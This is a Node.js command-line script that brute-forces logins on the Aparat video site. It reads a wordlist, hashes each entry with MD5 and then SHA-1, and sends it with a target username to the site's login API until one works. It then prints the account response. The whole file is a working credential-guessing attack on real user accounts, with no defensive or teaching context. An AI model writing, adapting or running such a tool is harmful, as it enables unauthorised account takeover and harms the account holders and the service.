#!/usr/bin/env node

const https = require("https");
const crypto = require("crypto");
const fs = require("fs");
const argv = process.argv;

class encrypt{
  constructor(password){
    this.pass = String(password)
  }

  changeType(){
    const master = crypto.createHash("md5").update(this.pass).digest("hex")
    return crypto.createHash("sha1").update(master).digest("hex")
  }
}

class connection{
  constructor(user, password){
    this.user = user 
    this.password = password
    this.api = "https://www.aparat.com/etc/api/"
  }

  start(){
    return new Promise((resv, rej) => {
      try{
        https.get(`${this.api}login/luser/${this.user}/lpass/${this.password}`, (res) => {
          let data = "";

          res.on("data", (ch) => {
            data += ch;
          })

          res.on("end", () => {
            resv(JSON.parse(JSON.stringify(data)));
          })
        }).on("error", (err) => {
            rej(err);
          })
      }catch (error){
        rej(error);
      }
    })
}
}


if (argv.includes("-u") && argv.includes("-p")){
  const username = argv[argv.indexOf("-u")+1]
  const password = argv[argv.indexOf("-p")+1]

  if (username === undefined || password === undefined){
      console.log("please set username or password after -u / -p")
  }else{
      if (password === "--reader"){
        fs.readFile(argv[argv.indexOf("--reader")+1], "utf8", (err, data) => {
          if (err){
            console.log(err)
          }
          const fr = data.split("\n");
          for (b of fr){
            const item = String(b).replace("\r", "")
            console.log(item);
            const enc = new encrypt(item);
            const encx = enc.changeType();
            const connect = new connection(username, encx);
            connect.start().then((datax) => {
              if (JSON.parse(datax).login.type === "error"){
                console.log(`${item}: Faild`);
              }else{
                console.log(`${item}: True`);
                console.log(JSON.parse(datax))
                process.exit();
              }
            })
          }
        })
      }
    }
}
